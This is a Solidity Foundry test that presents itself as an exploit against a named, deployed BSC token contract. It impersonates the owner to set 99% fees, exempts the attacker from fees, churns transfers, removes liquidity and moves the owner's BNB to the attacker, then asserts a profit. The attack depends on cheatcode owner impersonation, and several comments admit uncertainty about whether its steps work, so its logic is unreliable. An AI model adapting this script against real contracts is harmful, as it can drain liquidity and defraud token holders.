// Use existing IERC20 from the test file

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner
        address owner = IONE1SHIBA(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Label important addresses
        vm.label(TARGET, "1SHIBA Token");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "PancakeRouter");

        // Get the pair address from the token
        address pair = IONE1SHIBA(TARGET).uniswapV2Pair();
        vm.label(pair, "Token-WETH Pair");

        // Give attacker some BNB to start
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(attacker).balance;

        // 1. Become owner (impersonate)
        address tokenOwner = IONE1SHIBA(TARGET).owner();
        vm.startPrank(tokenOwner);

        // 2. Set extremely high fees
        IONE1SHIBA(TARGET).setTaxFeePercent(99);
        IONE1SHIBA(TARGET).setLiquidityFeePercent(99);

        // Also exclude attacker from fees so we don't pay fees when receiving tokens back
        IONE1SHIBA(TARGET).excludeFromFee(attacker);

        vm.stopPrank();

        // 3. Get some tokens by swapping BNB for tokens
        // First approve router
        vm.startPrank(attacker);
        IERC20(TARGET).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, type(uint256).max);

        // Swap 10 BNB for tokens
        address[] memory path = new address[](2);
        path[0] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
        path[1] = TARGET;

        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        // Check our token balance
        uint256 tokenBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Tokens acquired:", tokenBalance);

        // 4. Create a recipient address (not excluded from fees)
        address recipient = address(0x123);

        // 5. Transfer tokens to trigger fees (multiple transfers to accumulate enough in contract)
        // We need to transfer enough to trigger swapAndLiquify (threshold is numTokensSellToAddToLiquidity)
        // Let's transfer several times
        for (uint i = 0; i < 10; i++) {
            if (tokenBalance / 20 == 0) break;
            uint256 transferAmount = tokenBalance / 20;
            IERC20(TARGET).transfer(recipient, transferAmount);

            // Transfer back to attacker (who is now excluded from fees)
            vm.prank(recipient);
            IERC20(TARGET).transfer(attacker, IERC20(TARGET).balanceOf(recipient));
        }

        // 6. Check contract token balance - if it's above threshold, swapAndLiquify should trigger
        uint256 contractTokenBalance = IERC20(TARGET).balanceOf(TARGET);
        console.log("Contract token balance:", contractTokenBalance);

        // 7. If swapAndLiquify hasn't triggered automatically, we might need to trigger it
        // by making another transfer from a non-excluded address
        if (contractTokenBalance > 0) {
            // Transfer from attacker (excluded) to recipient (not excluded) to trigger fee
            IERC20(TARGET).transfer(recipient, 1000 * 10**9); // Small amount

            // Transfer back from recipient (pays fees)
            vm.prank(recipient);
            IERC20(TARGET).transfer(address(0x456), IERC20(TARGET).balanceOf(recipient));
        }

        // 8. Now as owner, we should have received LP tokens
        // Let's check owner's LP token balance
        address pair = IONE1SHIBA(TARGET).uniswapV2Pair();
        vm.startPrank(tokenOwner);
        uint256 lpBalance = IERC20(pair).balanceOf(tokenOwner);
        console.log("Owner LP balance:", lpBalance);

        // 9. Burn LP tokens to get BNB
        if (lpBalance > 0) {
            // Approve router to spend LP tokens
            IERC20(pair).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, lpBalance);

            // Remove liquidity
            IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E).removeLiquidityETHSupportingFeeOnTransferTokens(
                TARGET,
                lpBalance,
                0,
                0,
                tokenOwner,
                block.timestamp + 1000
            );
        }
        vm.stopPrank();

        // 10. Transfer owner's BNB to attacker to show profit
        vm.prank(tokenOwner);
        (bool success, ) = attacker.call{value: address(tokenOwner).balance}("");
        require(success, "Transfer failed");

        // Final balance check
        uint256 finalBalance = address(attacker).balance;
        console.log("Initial BNB balance:", initialBalance);
        console.log("Final BNB balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // Assert profit
        assertGt(finalBalance, initialBalance, "BNB balance should increase");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

